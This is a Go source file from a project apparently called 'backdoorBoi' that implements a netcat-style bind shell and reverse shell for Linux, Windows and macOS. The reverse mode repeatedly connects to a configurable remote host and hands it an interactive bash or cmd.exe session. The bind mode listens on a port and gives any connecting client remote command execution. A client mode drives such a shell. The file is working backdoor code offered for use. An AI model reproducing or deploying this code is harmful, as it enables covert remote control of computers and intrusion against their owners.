package netcat

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/BuildAndDestroy/backdoorBoi/pkg/environment"
)

type NetcatInput struct {
	HostAddress string
	Port        int
	Bind        bool
	Reverse     bool
	Caller      bool
}

func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
	fs.StringVar(&nni.HostAddress, "address", "127.0.0.1", "Set host address, default is 127.0.0.1")
	fs.IntVar(&nni.Port, "port", 8080, "Provide a port to bind to on this host")
	fs.BoolVar(&nni.Bind, "bind", false, "Set Flag for Bind shell. Note: do not use with --reverse")
	fs.BoolVar(&nni.Reverse, "reverse", false, "Set Flag for a Reverse Shell. Note: do not use with --bind")
	fs.BoolVar(&nni.Caller, "caller", false, "Call to a bind shell.")
}

func NetcatBind(nni *NetcatInput) {
	var (
		bindAddress = fmt.Sprintf(":%d", nni.Port)
		osRuntime   = *environment.OperatingSystemDetect()
		callAddress = fmt.Sprintf("%s:%d", nni.HostAddress, nni.Port)
	)

	if nni.Bind && nni.Reverse && nni.Caller {
		log.Fatalln("Cannot bind, reverse, and call at the same time.")
	}
	if nni.Bind && nni.Reverse {
		log.Fatalln("Cannot bind and reverse at the same time.")
	}
	if nni.Bind && nni.Caller {
		log.Fatalln("Cannot bind and call at the same time.")
	}
	if nni.Reverse && nni.Caller {
		log.Fatalln("Cannot reverse and call at the same time.")
	}

	if nni.Bind {
		BindLogic(bindAddress, osRuntime)
	}
	if nni.Reverse {
		ReverseLogic(callAddress, osRuntime)
	}
	if nni.Caller {
		CallBindLogic(callAddress, osRuntime)
	}
}

func ReverseLogic(callAddress string, osRuntime string) {
	for {
		caller, err := net.Dial("tcp", callAddress)
		if err != nil {
			log.Println(err)
			log.Println("[*] Retrying in 5 seconds")
			time.Sleep(5 * time.Second)
		}
		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
		switch osRuntime {
		case "linux":
			RevHandleLinux(caller)
		case "windows":
			RevHandleWindows(caller)
		case "darwin":
			RevHandleDarwin(caller)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func BindLogic(bindAddress string, osRuntime string) {
	listener, err := net.Listen("tcp", bindAddress)
	if err != nil {
		log.Fatalf("Unable to bind to port %s", bindAddress)
	}
	defer listener.Close()
	log.Println("[*] Binding shell spawning for remote code execution")
	for {
		conn, err := listener.Accept()
		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
		if err != nil {
			log.Fatalln("Unable to accept connection.")
		}
		switch osRuntime {
		case "linux":
			go SimpleHandleLinux(conn)
		case "windows":
			go SimpleHandleWindows(conn)
		case "darwin":
			go SimpleHandleDarwin(conn)
		default:
			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
		}
	}
}

func SimpleHandleLinux(conn net.Conn) {
	// Bind Shell
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	cmd := exec.Command("/bin/bash", "-i")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func SimpleHandleWindows(conn net.Conn) {
	// Bind Shell
	// Explicitly calling cmd.exe for cmd execution
	// so that we can use it for stdin and stdout
	cmd := exec.Command("cmd.exe")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func SimpleHandleDarwin(conn net.Conn) {
	// Bind Shell
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func RevHandleLinux(caller net.Conn) {
	log.Println("Linux")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
}

func RevHandleWindows(caller net.Conn) {
	log.Println("Windows")
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
}

func RevHandleDarwin(caller net.Conn) {
	log.Println("Darwin")
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = caller
	cmd.Stdout = caller
	cmd.Stderr = caller
	cmd.Run()
}

func CallBindLogic(callAddress string, osRuntime string) {
	caller, err := net.Dial("tcp", callAddress)
	if err != nil {
		log.Fatalln(err)
	}
	defer caller.Close()

	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)

	BindShellCall(caller)
}

func BindShellCall(caller net.Conn) {
	for {
		reader := bufio.NewReader(os.Stdin)
		text, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}
		text = strings.TrimSpace(text)
		_, err = io.WriteString(caller, text+"\n")
		if err != nil {
			log.Fatalln(err)
		}
		go io.Copy(os.Stdout, caller)
	}
}
